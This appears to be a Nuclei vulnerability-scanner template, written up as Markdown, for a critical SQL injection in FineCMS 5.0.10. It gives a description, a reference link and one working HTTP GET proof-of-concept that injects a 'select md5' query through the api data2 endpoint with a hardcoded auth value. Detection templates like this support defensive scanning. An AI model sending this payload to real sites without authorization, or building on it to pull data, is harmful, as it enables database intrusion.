# Nuclei Template: FineCMS 5.0.10 - SQL Injection
**Template ID:** finecms-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`finecms-sqli.yaml`)

## Vulnerability Information & PoC

## Description
FineCMS 5.0.10 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{num}})%27
```

## References
- https://blog.csdn.net/dfdhxb995397/article/details/101385340
